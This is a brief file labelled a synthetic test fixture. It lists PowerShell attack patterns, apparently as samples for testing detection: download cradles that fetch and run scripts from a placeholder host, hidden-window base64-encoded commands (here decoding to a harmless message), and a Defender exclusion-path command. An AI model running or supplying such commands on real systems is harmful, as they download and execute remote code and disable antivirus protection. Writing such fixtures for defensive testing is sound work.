# SYNTHETIC TEST FIXTURE — not functional
IEX (New-Object Net.WebClient).DownloadString('https://payload.example.invalid/x.ps1')
powershell -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAgAGYAcgBvAG0AIAB0AGgAZQAgAHMAeQBuAHQAaABlAHQAaQBjACAAZgBpAHgAdAB1AHIAZQA7ACAAbgBvAHQAIAByAHUAbgAnAA==
iex (iwr 'https://payload.example.invalid/y.ps1' -UseBasicParsing)
powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAgAGYAcgBvAG0AIAB0AGgAZQAgAHMAeQBuAHQAaABlAHQAaQBjACAAZgBpAHgAdAB1AHIAZQA7ACAAbgBvAHQAIAByAHUAbgAnAA==
Add-MpPreference -ExclusionPath "C:\Fixture\Dir"
